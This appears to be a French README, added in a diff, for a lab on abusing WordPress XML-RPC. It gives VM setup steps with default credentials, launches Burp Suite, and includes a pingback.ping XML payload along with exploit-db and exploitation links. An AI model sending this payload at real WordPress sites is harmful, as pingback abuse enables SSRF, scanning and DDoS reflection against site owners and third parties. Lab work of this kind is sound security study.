@@ -1,0 +1,69 @@
+#Lancer le Vagrantfile pour installer la machine virtuelle
+
+Vagrant up
+
+
+
+#Desactiver la synchronisation automatique de la date/heure de votre VM :
+
+VBoxManage setextradata "VM-Name" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
+
+
+
+#Lancer la machine virtuelle :
+
+Username: root
+Mot de passe : toor
+
+
+
+#dès que vous êtes à l'intérieur de votre VM cloner le fichier XMLRPC pour avoir les fichiers nécessaires :
+
+git clone https://github.com/Hichamdarouach/XMLRPC.git
+
+
+
+#Cahngez la version de java à utiliser (il nous faut la version 8)
+
+sudo update-alternatives --config java
+
+#Puis sélectionner la version 8 selon le numéro qui lui est attribué
+
+x
+
+
+#Lancer Burp professionnel
+
+java -jar Burpsuite
+
+
+# pour ajuster votre requête Burp:
+
+POST -> GET
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://CHANGELINK</string></value>
+</param>
+<param>
+<value><string>http://xmlrpcensimag.tk</string></value>
+</param>
+</params>
+</methodCall>
+
+
+
+
+Liens:
+
+https://www.exploit-db.com/exploits/47800
+
+https://kinsta.com/blog/xmlrpc-php
+
+https://www.hkcert.org/myurl/en/blog/14101401
+
+https://www.hostinger.com/tutorials/xmlrpc-wordpress
+
+https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions
